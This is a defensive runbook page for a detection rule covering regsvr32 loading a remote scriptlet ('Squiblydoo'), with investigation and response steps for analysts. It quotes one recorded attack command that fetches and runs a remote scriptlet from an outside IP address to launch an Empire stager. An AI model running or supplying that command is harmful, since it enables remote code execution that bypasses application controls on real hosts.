# Regsvr32 Loading a Scriptlet (Squiblydoo)

| | |
|---|---|
| Rule | [`rules/windows/process_creation/proc_creation_win_regsvr32_remote_scriptlet.yml`](../rules/windows/process_creation/proc_creation_win_regsvr32_remote_scriptlet.yml) |
| Severity | high |
| ATT&CK | [T1218.010](https://attack.mitre.org/techniques/T1218/010/) |
| Test samples | [`tests/data/proc_creation_win_regsvr32_remote_scriptlet/`](../tests/data/proc_creation_win_regsvr32_remote_scriptlet/) |

## What it means

`regsvr32.exe` loaded `scrobj.dll` with a scriptlet given by `/i:`. This "Squiblydoo" trick
runs remote script through a signed binary without admin rights. The recorded attack ran
`regsvr32 /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll`, which started an
Empire stager.

## Investigate

1. Collect the URL and fetch the scriptlet in a sandbox: it is XML with embedded
   JScript/VBScript.
2. Check the parent and the user, then the children of `regsvr32.exe`.
3. Look for the network connection from `regsvr32.exe` (Sysmon 3): a signed binary
   talking to the Internet is unusual.

## False positives

- None expected. DLL registration does not use `scrobj.dll` with a remote `/i:` argument.

## Respond

- Isolate the host, block the URL, and hunt for the same URL across the fleet.
- Investigate the stage that ran regsvr32 (it is never the first step).
